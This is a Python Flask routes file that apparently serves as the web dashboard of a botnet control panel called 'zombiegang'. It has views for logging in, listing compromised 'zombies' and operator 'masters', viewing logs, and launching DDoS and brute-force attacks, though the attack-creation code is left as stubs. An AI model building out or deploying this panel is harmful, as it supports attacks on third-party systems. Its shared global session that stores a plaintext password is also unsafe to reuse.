#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

from app import app
from flask import render_template, redirect, url_for, request

from datetime import datetime, timedelta
from functools import wraps

from app.objects import zession, token
from app.get_data import filter
from app.update_data import update_user


# init zombiegang session object
zession = zession.Zession
token = token.Token()


# Defining our custom decorator
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if zession.jwt == '':
            return render_template("errors/not-authorized.html")
        else:
            token.check_for_refresh(zession)
        return f(*args, **kwargs)
    return decorated_function


@app.route('/', methods=['GET', 'POST'])
@app.route('/index/', methods=['GET', 'POST'])
@app.route('/login/', methods=['GET', 'POST'])
def login():
    error = None
    # print(zession)
    if zession.jwt:
        return redirect(url_for("dashboard"))
    if request.method == 'POST':
        hostname = request.form.get('hostname')
        username = request.form.get('username')
        pswd = request.form.get('pswd')
        if token.jwt_login(username, pswd, hostname):
            zession.remote_hostname = hostname
            zession.username = username
            zession.password = pswd
            zession.jwt = token.jwt
            return redirect(url_for("game"))
        else:
            error = token.error
    return render_template("login.html", error=error, zession=zession)

@app.route('/logout/', methods=['GET', 'POST'])
@login_required
def logout():
    zession.jwt = False
    return redirect(url_for("login"))

@app.route('/game/', methods=['GET', 'POST'])
@login_required
def game():
    return render_template("game.html", zession=zession)

@app.route('/dashboard/', methods=['GET', 'POST'])
@login_required
def dashboard():
    return render_template("dashboard/base_dashboard.html", zession=zession)

@app.route('/access-logs/', methods=['GET', 'POST'])
@login_required
def access_logs():
    zession.current_section = 'logs'

    data = {}
    error = None
    # first request get only last hour access logs
    by_datetime_aft = (datetime.now() - timedelta(hours = 1)).strftime('%Y-%m-%d %H:%M:%S')
    by_username = by_datetime_bef = ''
    # filter data
    data = filter(zession, request, 'access_logs', by_username, by_datetime_bef, by_datetime_aft)
    if not data:
        error = '0 logs found'

    return render_template("dashboard/logs/access-logs.html", zession=zession, error=error, data=data)

@app.route('/zombies/', methods=['GET', 'POST'])
@login_required
def zombies():
    zession.current_section = 'members'

    data = {}
    error = None
    by_username = by_datetime_bef = by_datetime_aft = ''
    # filter data
    data = filter(zession, request, 'zombies', by_username, by_datetime_bef, by_datetime_aft)
    if not data:
        error = '0 zombies found'

    return render_template("dashboard/members/zombies.html", zession=zession, error=error, data=data)


@app.route('/masters/', methods=['GET', 'POST'])
@login_required
def masters():

    zession.current_section = 'members'
    data = {}
    error = None

    if (request.method) == 'POST' and ('btn-edit-profile' in request.form):
        return redirect(url_for('edit_profile'))

    by_username = ''
    # filter data
    data = filter(zession, request, 'masters', by_username)
    if not data:
        error = '0 masters found'

    return render_template("dashboard/members/masters.html", zession=zession, error=error, data=data)


@app.route('/edit-profile/', methods=['GET', 'POST'])
@login_required
def edit_profile():
    zession.current_section = 'members'
    data = {}
    error = None

    if (request.method) == 'POST' and ('btn-filter' in request.form):
        return redirect(url_for('masters'))

    elif request.method == 'POST':
        # update master password
        if ('pswd-btn' in request.form):
            if not request.form.get('pswd'):
                error = 'introduce the new password'
            else:
                response = update_user(zession, zession.username, request.form.get('pswd'))
                if response and ('jwt' in response):
                    zession.jwt = response['jwt']
                    error = 'password updated'

        # update master public key
        elif ('public_key_btn' in request.form):
            if not request.form.get('public_key'):
                error = 'introduce the new public_key'
            # ...

    return render_template("dashboard/members/edit-profile.html", zession=zession, update_error=error, data=data)

@app.route('/ddos-attacks/', methods=['GET', 'POST'])
@login_required
def ddos_attacks():
    zession.current_section = 'tools'
    data = {}
    error = None

    # filter data
    if (request.method == 'POST') and ('btn-filter' in request.form):
        data = filter(zession, request, 'ddos-attacks')
        if not data:
            error = '0 attacks found'

    # create ddos attacks
    if (request.method == 'POST') and ('creator' in request.form):
        print(request.form.get('ddos_type'))
        # ...

    return render_template("dashboard/tools/ddos-attacks.html", zession=zession, error=error, data=data)


@app.route('/brute-attacks/', methods=['GET', 'POST'])
@login_required
def brute_attacks():
    zession.current_section = 'tools'
    data = {}
    error = None

    # filter data
    if (request.method == 'POST') and ('btn-filter' in request.form):
        data = filter(zession, request, 'brute-attacks')
        if not data:
            error = '0 attacks found'

    if (request.method == 'POST') and ('creator' in request.form):
        pass
        # ...

    return render_template("dashboard/tools/brute-attacks.html", zession=zession, error=error, data=data)